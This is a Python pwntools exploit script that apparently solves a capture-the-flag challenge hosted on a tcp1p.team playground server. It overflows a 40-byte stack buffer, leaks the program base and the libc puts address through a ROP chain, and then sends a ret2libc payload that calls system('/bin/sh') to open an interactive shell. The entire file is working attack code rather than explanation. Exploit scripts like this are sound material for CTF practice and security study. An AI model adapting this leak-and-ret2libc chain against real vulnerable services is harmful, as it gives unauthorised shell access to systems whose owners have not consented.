#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc6_2.35-0ubuntu3.8_amd64.so")
ld = ELF("./ld-2.35.so")

context.binary = elf


def conn():
    if args.LOCAL:
        p = process([elf.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("playground.tcp1p.team", 19001)

    return p


def main():
   
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    p = conn()
    rop = ROP(elf)
    offset = 40

    # Trigger leak
    p.sendline("2")
    p.sendline("1")
    p.recvuntil(b"oke okeeeyy ini pie nya untukmuu, ")
    leak_main = int(p.recvline().strip().decode(), 16)

    # Calculate base address
    main_symbol = elf.sym['main']
    elf.address = leak_main - main_symbol
    log.info(f"ELF Base: {hex(elf.address)}")

    # Manually set gadgets based on dump()
    mov_rdi_rbp_nop_pop_rbp_ret = elf.address + 0x11e7
    pop_rbp_ret = elf.address + 0x1173
    ret = elf.address + 0x1016

    # Debugging gadgets
    log.info(f"mov rdi, rbp; nop; pop rbp; ret: {hex(mov_rdi_rbp_nop_pop_rbp_ret)}")
    log.info(f"pop rbp; ret: {hex(pop_rbp_ret)}")

    # Build ROP chain
    rop.raw(b"A" * offset)
    rop.raw(pop_rbp_ret)      # Align stack
    rop.raw(elf.got['puts'])  # Set RBP for `mov rdi, rbp`
    rop.raw(mov_rdi_rbp_nop_pop_rbp_ret)
    rop.raw(p64(elf.got['puts']))
    rop.raw(elf.plt['puts'])
    rop.raw(elf.sym['main'])  # Return to main

    # Send payload
    p.sendline("3")
    p.sendline(rop.chain())
    p.recvuntil(b"\n\n")
    leak_libc = u64(p.recv(6).strip() + b'\x00\x00')
    log.info(f"{hex(leak_libc)}")
    libc.address = leak_libc - libc.sym['puts'] 
    log.info(f"{hex(libc.address)}")
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym['system']
    rop3 = ROP(libc)
    rdi = rop3.find_gadget(['pop rdi','ret'])[0]
    p.sendline("3")
    rop2 = ROP(elf)
    rop2.raw(b"A" * offset)
    rop2.raw(rdi)
    rop2.raw(bin_sh)
    rop2.raw(ret)
    rop2.raw(system)
    write("payload",rop2.chain())
    p.sendline(rop2.chain())
    write("payload",rop2.chain())
    print(rop2.dump())

    p.interactive()



if __name__ == "__main__":
    main()
